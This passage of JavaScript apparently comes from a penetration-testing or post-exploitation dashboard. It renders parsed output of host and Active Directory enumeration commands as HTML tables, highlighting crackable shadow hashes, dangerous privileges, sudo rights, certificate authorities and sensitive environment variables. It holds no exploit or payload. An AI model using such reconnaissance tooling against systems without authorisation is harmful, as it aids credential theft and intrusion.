        const tr = document.createElement('tr');
        tr.className = 'border-t border-slate-100';
        [c.proto, `${c.localAddr}:${c.localPort}`, `${c.remoteAddr}:${c.remotePort}`, c.state].forEach(val => {
          const td = document.createElement('td');
          td.className = 'py-0.5 pr-4 text-slate-600';
          td.textContent = val ?? '';
          tr.appendChild(td);
        });
        table.appendChild(tr);
      });
      if (established.length > 10) {
        const tr = document.createElement('tr');
        const td = document.createElement('td');
        td.colSpan = 4;
        td.className = 'py-1 text-slate-400 text-xs';
        td.textContent = `…and ${established.length - 10} more`;
        tr.appendChild(td);
        table.appendChild(tr);
      }
      section.appendChild(table);
      card.appendChild(section);
    }
    return;
  }

  if (snap.commandType === 'pslist') {
    const procs = snap.parsed.processes || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Processes (${procs.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    procs.slice(0, 15).forEach(p => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      [p.pid, p.name, p.user ?? '', p.cmd ?? ''].forEach((val, i) => {
        const td = document.createElement('td');
        td.className = `py-0.5 pr-4 text-slate-600 ${i === 3 ? 'truncate max-w-xs' : ''}`;
        td.textContent = val ?? '';
        tr.appendChild(td);
      });
      table.appendChild(tr);
    });
    if (procs.length > 15) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 4;
      td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${procs.length - 15} more`;
      tr.appendChild(td);
      table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'ipconfig') {
    const ifaces = snap.parsed.interfaces || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = 'Interfaces';
    card.appendChild(label);
    ifaces.forEach(iface => {
      iface.addresses.forEach(addr => {
        const row = document.createElement('div');
        row.className = 'flex gap-4 text-xs font-mono py-0.5 border-t border-slate-100';
        const n = document.createElement('span');
        n.className = 'text-slate-500 w-40 flex-shrink-0 truncate';
        n.textContent = iface.name;
        const ip = document.createElement('span');
        ip.className = 'text-slate-700';
        ip.textContent = addr.ip + (addr.mask ? ' / ' + addr.mask : '');
        const gw = document.createElement('span');
        gw.className = 'text-slate-400';
        gw.textContent = addr.gateway ? `gw ${addr.gateway}` : '';
        row.appendChild(n);
        row.appendChild(ip);
        row.appendChild(gw);
        card.appendChild(row);
      });
    });
    return;
  }

  if (snap.commandType === 'uname') {
    const el = document.createElement('p');
    el.className = 'text-xs font-mono text-slate-600 bg-slate-50 rounded px-2 py-1.5';
    el.textContent = snap.parsed.raw || '';
    card.appendChild(el);
    return;
  }

  if (snap.commandType === 'arp') {
    const entries = snap.parsed.entries || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `ARP entries (${entries.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    entries.slice(0, 20).forEach(e => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      [e.ip, e.mac, e.type ?? '', e.iface ?? ''].forEach(val => {
        const td = document.createElement('td');
        td.className = 'py-0.5 pr-4 text-slate-600';
        td.textContent = val ?? '';
        tr.appendChild(td);
      });
      table.appendChild(tr);
    });
    if (entries.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 4; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${entries.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'netuser') {
    const p = snap.parsed;
    if (p.type === 'list') {
      const label = document.createElement('p');
      label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      label.textContent = `Local accounts (${p.users.length})`;
      card.appendChild(label);
      const pills = document.createElement('div');
      pills.className = 'flex flex-wrap gap-1.5';
      p.users.forEach(u => {
        const pill = document.createElement('span');
        pill.className = 'inline-block px-2 py-0.5 rounded bg-slate-100 text-slate-700 text-xs font-mono';
        pill.textContent = u.username;
        pills.appendChild(pill);
      });
      card.appendChild(pills);
    } else {
      // detail view
      const rows = [
        ['Username',         p.username],
        ['Full name',        p.fullName],
        ['Account active',   p.accountActive ? 'Yes' : 'No'],
        ['Last logon',       p.lastLogon],
        ['Password last set',p.passwordLastSet],
        ['Password expires', p.passwordExpires],
      ].filter(([, v]) => v != null);
      const table = document.createElement('table');
      table.className = 'w-auto text-xs mb-2';
      rows.forEach(([k, v]) => {
        const tr = document.createElement('tr');
        tr.className = 'border-t border-slate-100';
        const kTd = document.createElement('td');
        kTd.className = 'py-0.5 pr-4 text-slate-500 w-40';
        kTd.textContent = k;
        const vTd = document.createElement('td');
        vTd.className = 'py-0.5 text-slate-700 font-mono';
        vTd.textContent = String(v);
        tr.appendChild(kTd); tr.appendChild(vTd);
        table.appendChild(tr);
      });
      card.appendChild(table);
      if (p.localGroups.length || p.globalGroups.length) {
        const gl = document.createElement('p');
        gl.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1 mt-2';
        gl.textContent = 'Group memberships';
        card.appendChild(gl);
        const pills = document.createElement('div');
        pills.className = 'flex flex-wrap gap-1.5';
        [...p.localGroups, ...p.globalGroups].forEach(g => {
          const pill = document.createElement('span');
          pill.className = 'inline-block px-2 py-0.5 rounded bg-indigo-50 text-indigo-700 text-xs font-mono';
          pill.textContent = g;
          pills.appendChild(pill);
        });
        card.appendChild(pills);
      }
    }
    return;
  }

  if (snap.commandType === 'localadmins') {
    const { groupName, members } = snap.parsed;
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `${groupName} members (${members.length})`;
    card.appendChild(label);
    const pills = document.createElement('div');
    pills.className = 'flex flex-wrap gap-1.5';
    members.forEach(m => {
      const pill = document.createElement('span');
      pill.className = `inline-block px-2 py-0.5 rounded text-xs font-mono ${
        m.isDomain ? 'bg-amber-50 text-amber-800' : 'bg-slate-100 text-slate-700'
      }`;
      pill.textContent = m.name;
      pills.appendChild(pill);
    });
    card.appendChild(pills);
    return;
  }

  if (snap.commandType === 'sessions') {
    const sessions = snap.parsed.sessions || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Sessions (${sessions.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    sessions.slice(0, 10).forEach(s => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      [s.sessionName ?? '—', s.username ?? '—', s.id, s.state].forEach(val => {
        const td = document.createElement('td');
        td.className = 'py-0.5 pr-4 text-slate-600';
        td.textContent = val ?? '';
        tr.appendChild(td);
      });
      table.appendChild(tr);
    });
    if (sessions.length > 10) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 4; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${sessions.length - 10} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'passwd') {
    const users = snap.parsed.users || [];
    const loginUsers    = users.filter(u => u.isLoginShell && !u.isServiceAccount);
    const serviceUsers  = users.filter(u => u.isServiceAccount);
    if (loginUsers.length) {
      const label = document.createElement('p');
      label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      label.textContent = `Login-capable accounts (${loginUsers.length})`;
      card.appendChild(label);
      const table = document.createElement('table');
      table.className = 'w-auto text-xs font-mono mb-2';
      loginUsers.forEach(u => {
        const tr = document.createElement('tr');
        tr.className = 'border-t border-slate-100';
        [u.username, `uid:${u.uid}`, u.home ?? '', u.shell ?? ''].forEach(val => {
          const td = document.createElement('td');
          td.className = 'py-0.5 pr-4 text-slate-600';
          td.textContent = val;
          tr.appendChild(td);
        });
        table.appendChild(tr);
      });
      card.appendChild(table);
    }
    const svcLabel = document.createElement('p');
    svcLabel.className = 'text-xs text-slate-400 mt-1';
    svcLabel.textContent = `${serviceUsers.length} service account${serviceUsers.length !== 1 ? 's' : ''} (uid < 1000)`;
    card.appendChild(svcLabel);
    return;
  }

  if (snap.commandType === 'shadow') {
    const entries = snap.parsed.entries || [];
    const crackable = entries.filter(e => e.hasHash);
    const locked    = entries.filter(e => e.locked);
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Shadow entries (${entries.length})`;
    card.appendChild(label);
    if (crackable.length) {
      const warn = document.createElement('p');
      warn.className = 'text-xs text-amber-700 bg-amber-50 rounded px-2 py-1 mb-2 font-mono';
      warn.textContent = `${crackable.length} crackable hash${crackable.length !== 1 ? 'es' : ''}: ${crackable.map(e => `${e.username} (${e.hashAlgo})`).join(', ')}`;
      card.appendChild(warn);
    }
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    entries.slice(0, 20).forEach(e => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const status = e.locked ? 'locked' : e.hasHash ? `hash:${e.hashAlgo}` : 'no hash';
      [e.username, status].forEach((val, i) => {
        const td = document.createElement('td');
        td.className = `py-0.5 pr-4 ${i === 1 ? (e.hasHash ? 'text-amber-700' : 'text-slate-400') : 'text-slate-600'}`;
        td.textContent = val;
        tr.appendChild(td);
      });
      table.appendChild(tr);
    });
    if (entries.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 2; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${entries.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'lastlog') {
    const entries = snap.parsed.entries || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Login history (${entries.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    entries.slice(0, 15).forEach(e => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      [
        e.username,
        e.terminal,
        e.fromIp ?? 'local',
        e.loginTime,
        e.stillLoggedIn ? 'still in' : (e.duration ?? ''),
      ].forEach(val => {
        const td = document.createElement('td');
        td.className = 'py-0.5 pr-3 text-slate-600';
        td.textContent = val ?? '';
        tr.appendChild(td);
      });
      table.appendChild(tr);
    });
    if (entries.length > 15) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 5; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${entries.length - 15} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'whoami') {
    const p = snap.parsed;
    // user / admin badge
    const userRow = document.createElement('div');
    userRow.className = 'flex items-center gap-2 mb-2';
    const userPill = document.createElement('span');
    userPill.className = 'text-xs font-mono bg-slate-100 text-slate-700 px-2 py-0.5 rounded';
    userPill.textContent = p.username ?? '(unknown)';
    userRow.appendChild(userPill);
    if (p.isAdmin) {
      const adminBadge = document.createElement('span');
      adminBadge.className = 'text-xs font-semibold bg-red-100 text-red-700 px-2 py-0.5 rounded';
      adminBadge.textContent = 'ADMIN';
      userRow.appendChild(adminBadge);
    }
    card.appendChild(userRow);
    if (p.dangerousPrivileges.length) {
      const dp = document.createElement('div');
      dp.className = 'mb-2';
      const dpLabel = document.createElement('p');
      dpLabel.className = 'text-xs font-semibold text-red-600 mb-1';
      dpLabel.textContent = 'Dangerous privileges (enabled):';
      dp.appendChild(dpLabel);
      const pills = document.createElement('div');
      pills.className = 'flex flex-wrap gap-1';
      p.dangerousPrivileges.forEach(priv => {
        const pill = document.createElement('span');
        pill.className = 'text-xs font-mono bg-red-50 text-red-700 px-2 py-0.5 rounded';
        pill.textContent = priv;
        pills.appendChild(pill);
      });
      dp.appendChild(pills);
      card.appendChild(dp);
    }
    if (p.groups.length) {
      const gLabel = document.createElement('p');
      gLabel.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      gLabel.textContent = `Groups (${p.groups.length})`;
      card.appendChild(gLabel);
      const pills = document.createElement('div');
      pills.className = 'flex flex-wrap gap-1';
      p.groups.slice(0, 10).forEach(g => {
        const pill = document.createElement('span');
        pill.className = 'text-xs font-mono bg-slate-100 text-slate-600 px-2 py-0.5 rounded';
        pill.textContent = g.name;
        pills.appendChild(pill);
      });
      if (p.groups.length > 10) {
        const more = document.createElement('span');
        more.className = 'text-xs text-slate-400 px-2 py-0.5';
        more.textContent = `+${p.groups.length - 10} more`;
        pills.appendChild(more);
      }
      card.appendChild(pills);
    }
    return;
  }

  if (snap.commandType === 'sudol') {
    const p = snap.parsed;
    if (!p.canRunSudo) {
      const el = document.createElement('p');
      el.className = 'text-xs text-slate-400 italic';
      el.textContent = 'User may not run sudo.';
      card.appendChild(el);
      return;
    }
    if (p.canRunAll) {
      const warn = document.createElement('p');
      warn.className = 'text-xs font-semibold text-red-600 bg-red-50 rounded px-2 py-1 mb-2';
      warn.textContent = `${p.username ?? 'User'} can run ALL commands as ALL users (effectively root).`;
      card.appendChild(warn);
    }
    p.entries.forEach(e => {
      const row = document.createElement('div');
      row.className = 'text-xs font-mono border-t border-slate-100 py-0.5 text-slate-600';
      const runAs = document.createElement('span');
      runAs.className = 'text-slate-400 mr-2';
      runAs.textContent = `(${e.runAs})${e.nopasswd ? ' NOPASSWD:' : ''}`;
      row.appendChild(runAs);
      row.appendChild(document.createTextNode(e.commands.join(', ')));
      card.appendChild(row);
    });
    return;
  }

  if (snap.commandType === 'netaccounts') {
    const p = snap.parsed;
    const rows = [
      ['Min password age',    p.minPasswordAge],
      ['Max password age',    p.maxPasswordAge],
      ['Min password length', p.minPasswordLength],
      ['Password history',    p.passwordHistory],
      ['Lockout threshold',   p.lockoutThreshold],
      ['Lockout duration',    p.lockoutDuration],
      ['Lockout window',      p.lockoutWindow],
      ['Computer role',       p.computerRole],
    ].filter(([, v]) => v != null);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs';
    rows.forEach(([k, v]) => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const kTd = document.createElement('td');
      kTd.className = 'py-0.5 pr-4 text-slate-500 w-48';
      kTd.textContent = k;
      const vTd = document.createElement('td');
      vTd.className = 'py-0.5 text-slate-700 font-mono';
      vTd.textContent = String(v);
      tr.appendChild(kTd); tr.appendChild(vTd);
      table.appendChild(tr);
    });
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'netshare') {
    const shares = snap.parsed.shares || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Shares (${shares.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    shares.slice(0, 15).forEach(s => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const nameTd = document.createElement('td');
      nameTd.className = `py-0.5 pr-4 font-semibold ${s.isAdmin ? 'text-slate-400' : 'text-indigo-700'}`;
      nameTd.textContent = s.name;
      const pathTd = document.createElement('td');
      pathTd.className = 'py-0.5 pr-4 text-slate-600';
      pathTd.textContent = s.path ?? '—';
      const remarkTd = document.createElement('td');
      remarkTd.className = 'py-0.5 text-slate-400';
      remarkTd.textContent = s.remark ?? '';
      tr.appendChild(nameTd); tr.appendChild(pathTd); tr.appendChild(remarkTd);
      table.appendChild(tr);
    });
    if (shares.length > 15) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 3; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${shares.length - 15} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'addomain') {
    const p = snap.parsed;
    function kvRow(table, label, value) {
      if (value == null || value === '') return;
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const kTd = document.createElement('td');
      kTd.className = 'py-0.5 pr-4 text-slate-500 w-48 text-xs';
      kTd.textContent = label;
      const vTd = document.createElement('td');
      vTd.className = 'py-0.5 text-slate-700 font-mono text-xs';
      vTd.textContent = Array.isArray(value) ? (value.length ? value.join(', ') : '—') : String(value);
      tr.appendChild(kTd); tr.appendChild(vTd);
      table.appendChild(tr);
    }
    const table = document.createElement('table');
    table.className = 'w-auto text-xs';
    kvRow(table, 'Name',                  p.name);
    kvRow(table, 'NetBIOS Name',           p.netbiosName);
    kvRow(table, 'Domain SID',             p.domainSid);
    kvRow(table, 'Forest',                 p.forest);
    kvRow(table, 'Domain Mode',            p.domainMode);
    kvRow(table, 'Forest Mode',            p.forestMode);
    kvRow(table, 'PDC Emulator',           p.pdcEmulator);
    kvRow(table, 'RID Master',             p.ridMaster);
    kvRow(table, 'Schema Master',          p.schemaMaster);
    kvRow(table, 'Domain Naming Master',   p.domainNamingMaster);
    kvRow(table, 'Infrastructure Master',  p.infrastructureMaster);
    if (p.childDomains?.length)    kvRow(table, 'Child Domains',    p.childDomains);
    if (p.globalCatalogs?.length)  kvRow(table, 'Global Catalogs',  p.globalCatalogs);
    if (p.sites?.length)           kvRow(table, 'Sites',            p.sites);
    if (p.upnSuffixes?.length)     kvRow(table, 'UPN Suffixes',     p.upnSuffixes);
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'addomaincontrollers') {
    const dcs = snap.parsed.domainControllers || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2';
    label.textContent = `Domain Controllers (${dcs.length})`;
    card.appendChild(label);
    dcs.forEach(dc => {
      const dcCard = document.createElement('div');
      dcCard.className = 'border border-slate-100 rounded-lg px-3 py-2 mb-2 bg-slate-50';
      // Header row: name + badges
      const hdr = document.createElement('div');
      hdr.className = 'flex items-center gap-2 mb-1 flex-wrap';
      const namePill = document.createElement('span');
      namePill.className = 'text-xs font-mono font-semibold text-slate-700';
      namePill.textContent = dc.hostname ?? dc.name;
      hdr.appendChild(namePill);
      if (dc.isGlobalCatalog) {
        const gcBadge = document.createElement('span');
        gcBadge.className = 'text-xs bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded font-semibold';
        gcBadge.textContent = 'GC';
        hdr.appendChild(gcBadge);
      }
      if (dc.isReadOnly) {
        const roBadge = document.createElement('span');
        roBadge.className = 'text-xs bg-amber-100 text-amber-700 px-1.5 py-0.5 rounded font-semibold';
        roBadge.textContent = 'RODC';
        hdr.appendChild(roBadge);
      }
      dcCard.appendChild(hdr);
      // Detail rows
      const meta = [];
      if (dc.ip)     meta.push(['IP',   dc.ip]);
      if (dc.domain) meta.push(['Domain', dc.domain]);
      if (dc.site)   meta.push(['Site', dc.site]);
      if (dc.os)     meta.push(['OS',   dc.os]);
      meta.forEach(([k, v]) => {
        const row = document.createElement('div');
        row.className = 'flex gap-2 text-xs';
        const kEl = document.createElement('span');
        kEl.className = 'text-slate-400 w-14 flex-shrink-0';
        kEl.textContent = k;
        const vEl = document.createElement('span');
        vEl.className = 'text-slate-600 font-mono';
        vEl.textContent = v;
        row.appendChild(kEl); row.appendChild(vEl);
        dcCard.appendChild(row);
      });
      if (dc.roles?.length) {
        const rolesRow = document.createElement('div');
        rolesRow.className = 'flex gap-1 flex-wrap mt-1';
        dc.roles.forEach(r => {
          const pill = document.createElement('span');
          pill.className = 'text-xs bg-indigo-50 text-indigo-700 px-1.5 py-0.5 rounded font-mono';
          pill.textContent = r;
          rolesRow.appendChild(pill);
        });
        dcCard.appendChild(rolesRow);
      }
      card.appendChild(dcCard);
    });
    return;
  }

  if (snap.commandType === 'adtrusts') {
    const trusts = snap.parsed.trusts || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Domain Trusts (${trusts.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs';
    const thead = document.createElement('thead');
    const hr = document.createElement('tr');
    ['Target', 'Direction', 'Type', 'Transitive', 'Forest'].forEach(h => {
      const th = document.createElement('th');
      th.className = 'text-left py-0.5 pr-3 text-slate-400 font-medium text-xs';
      th.textContent = h;
      hr.appendChild(th);
    });
    thead.appendChild(hr);
    table.appendChild(thead);
    const tbody = document.createElement('tbody');
    trusts.forEach(t => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      // Target
      const tdTarget = document.createElement('td');
      tdTarget.className = 'py-0.5 pr-3 font-mono text-slate-700';
      tdTarget.textContent = t.targetDomain;
      // Direction badge
      const tdDir = document.createElement('td');
      tdDir.className = 'py-0.5 pr-3';
      const dirBadge = document.createElement('span');
      const dirColor = t.direction === 'BiDirectional' ? 'bg-green-100 text-green-700'
                     : t.direction === 'Inbound'       ? 'bg-blue-100 text-blue-700'
                     : t.direction === 'Outbound'      ? 'bg-amber-100 text-amber-700'
                     : 'bg-slate-100 text-slate-600';
      dirBadge.className = `text-xs px-1.5 py-0.5 rounded font-semibold ${dirColor}`;
      dirBadge.textContent = t.direction;
      tdDir.appendChild(dirBadge);
      // Type
      const tdType = document.createElement('td');
      tdType.className = 'py-0.5 pr-3 text-slate-500';
      tdType.textContent = t.trustType ?? '—';
      // Transitive
      const tdTrans = document.createElement('td');
      tdTrans.className = `py-0.5 pr-3 ${t.isTransitive ? 'text-slate-600' : 'text-amber-700'}`;
      tdTrans.textContent = t.isTransitive ? 'Yes' : 'No';
      // Forest
      const tdForest = document.createElement('td');
      tdForest.className = `py-0.5 ${t.isForest ? 'text-indigo-600' : 'text-slate-400'}`;
      tdForest.textContent = t.isForest ? 'Yes' : 'No';
      [tdTarget, tdDir, tdType, tdTrans, tdForest].forEach(td => tr.appendChild(td));
      tbody.appendChild(tr);
    });
    table.appendChild(tbody);
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'adous') {
    const ous = snap.parsed.ous || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Organizational Units (${ous.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs';
    ous.slice(0, 20).forEach(ou => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      const nameTd = document.createElement('td');
      nameTd.className = 'py-0.5 pr-4 text-slate-700 font-semibold w-40 truncate';
      nameTd.textContent = ou.name;
      const dnTd = document.createElement('td');
      dnTd.className = 'py-0.5 text-slate-500 font-mono truncate max-w-xs';
      dnTd.textContent = ou.distinguishedName;
      tr.appendChild(nameTd); tr.appendChild(dnTd);
      table.appendChild(tr);
    });
    if (ous.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 2; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${ous.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'adcs') {
    const cas = snap.parsed.cas || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2';
    label.textContent = `Certificate Authorities (${cas.length})`;
    card.appendChild(label);
    cas.forEach(ca => {
      const caCard = document.createElement('div');
      caCard.className = 'border border-slate-100 rounded-lg px-3 py-2 mb-2 bg-slate-50';
      const nameEl = document.createElement('p');
      nameEl.className = 'text-xs font-semibold text-slate-700 font-mono mb-1';
      nameEl.textContent = ca.name;
      caCard.appendChild(nameEl);
      const meta = [];
      if (ca.server)        meta.push(['Server', ca.server]);
      if (ca.config)        meta.push(['Config', ca.config]);
      if (ca.sanitizedName) meta.push(['Sanitized', ca.sanitizedName]);
      meta.forEach(([k, v]) => {
        const row = document.createElement('div');
        row.className = 'flex gap-2 text-xs';
        const kEl = document.createElement('span');
        kEl.className = 'text-slate-400 w-16 flex-shrink-0';
        kEl.textContent = k;
        const vEl = document.createElement('span');
        vEl.className = 'text-slate-600 font-mono truncate';
        vEl.textContent = v;
        row.appendChild(kEl); row.appendChild(vEl);
        caCard.appendChild(row);
      });
      if (ca.webEnrollmentServers?.length) {
        const webRow = document.createElement('div');
        webRow.className = 'flex gap-2 text-xs mt-1';
        const kEl = document.createElement('span');
        kEl.className = 'text-slate-400 w-16 flex-shrink-0';
        kEl.textContent = 'Web Enroll';
        const vEl = document.createElement('span');
        vEl.className = 'text-slate-600 font-mono';
        vEl.textContent = ca.webEnrollmentServers.join(', ');
        webRow.appendChild(kEl); webRow.appendChild(vEl);
        caCard.appendChild(webRow);
      }
      card.appendChild(caCard);
    });
    return;
  }

  if (snap.commandType === 'env') {
    const allVars = snap.parsed.vars || [];
    // Show sensitive first
    const sorted = [...allVars.filter(v => v.isSensitive), ...allVars.filter(v => !v.isSensitive)];
    const sensitiveCount = allVars.filter(v => v.isSensitive).length;
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Environment Variables (${allVars.length})${sensitiveCount ? ` — ${sensitiveCount} sensitive` : ''}`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    sorted.slice(0, 30).forEach(v => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100' + (v.isSensitive ? ' bg-amber-50' : '');
      const keyTd = document.createElement('td');
      keyTd.className = `py-0.5 pr-3 font-semibold w-48 truncate ${v.isSensitive ? 'text-amber-700' : 'text-slate-600'}`;
      keyTd.textContent = v.key;
      const valTd = document.createElement('td');
      valTd.className = 'py-0.5 text-slate-600 truncate max-w-xs';
      const displayVal = v.value.length > 60 ? v.value.slice(0, 60) + '…' : v.value;
      valTd.textContent = displayVal;
      valTd.title = v.value;
      tr.appendChild(keyTd); tr.appendChild(valTd);
      table.appendChild(tr);
    });
    if (sorted.length > 30) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 2; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${sorted.length - 30} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'schtasks') {
    const tasks = snap.parsed.tasks || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Scheduled Tasks (${tasks.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    tasks.slice(0, 20).forEach(t => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      // Task name
      const nameTd = document.createElement('td');
      const isNonMicrosoft = t.name && !t.name.toLowerCase().includes('\\microsoft\\') && !t.name.toLowerCase().startsWith('\\microsoft');
      nameTd.className = `py-0.5 pr-3 truncate max-w-xs ${isNonMicrosoft ? 'text-indigo-700' : 'text-slate-600'}`;
      nameTd.textContent = t.name;
      nameTd.title = t.name;
      // Run as
      const runAsTd = document.createElement('td');
      runAsTd.className = 'py-0.5 pr-3';
      if (t.isSystem) {
        const badge = document.createElement('span');
        badge.className = 'text-xs bg-red-100 text-red-700 px-1.5 py-0.5 rounded font-semibold';
        badge.textContent = 'SYSTEM';
        runAsTd.appendChild(badge);
      } else {
        runAsTd.className += ' text-slate-500';
        runAsTd.textContent = t.runAs ?? '—';
      }
      // Command
      const cmdTd = document.createElement('td');
      cmdTd.className = 'py-0.5 pr-3 text-slate-500 truncate max-w-xs';
      cmdTd.textContent = t.command ?? '—';
      cmdTd.title = t.command ?? '';
      // Status
      const statusTd = document.createElement('td');
      statusTd.className = 'py-0.5 text-slate-400';
      statusTd.textContent = t.status ?? '';
      tr.appendChild(nameTd); tr.appendChild(runAsTd); tr.appendChild(cmdTd); tr.appendChild(statusTd);
      table.appendChild(tr);
    });
    if (tasks.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 4; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${tasks.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'crontab') {
    const entries = snap.parsed.entries || [];
    const label = document.createElement('p');
    label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
    label.textContent = `Cron Jobs (${entries.length})`;
    card.appendChild(label);
    const table = document.createElement('table');
    table.className = 'w-auto text-xs font-mono';
    entries.slice(0, 20).forEach(e => {
      const tr = document.createElement('tr');
      tr.className = 'border-t border-slate-100';
      // Schedule cell
      const schTd = document.createElement('td');
      schTd.className = 'py-0.5 pr-3 w-40 flex-shrink-0';
      if (e.isAtJob) {
        const badge = document.createElement('span');
        badge.className = 'text-xs bg-slate-100 text-slate-600 px-1.5 py-0.5 rounded font-mono';
        badge.textContent = e.schedule;
        schTd.appendChild(badge);
      } else {
        schTd.className += ' text-slate-500';
        schTd.textContent = e.schedule;
      }
      // Command cell
      const cmdTd = document.createElement('td');
      cmdTd.className = `py-0.5 truncate max-w-xs ${e.isNonStandard ? 'text-amber-700' : 'text-slate-600'}`;
      cmdTd.textContent = e.command;
      cmdTd.title = e.command;
      tr.appendChild(schTd); tr.appendChild(cmdTd);
      table.appendChild(tr);
    });
    if (entries.length > 20) {
      const tr = document.createElement('tr');
      const td = document.createElement('td');
      td.colSpan = 2; td.className = 'py-1 text-slate-400 text-xs';
      td.textContent = `…and ${entries.length - 20} more`;
      tr.appendChild(td); table.appendChild(tr);
    }
    card.appendChild(table);
    return;
  }

  if (snap.commandType === 'services') {
    const allServices = snap.parsed.services || [];
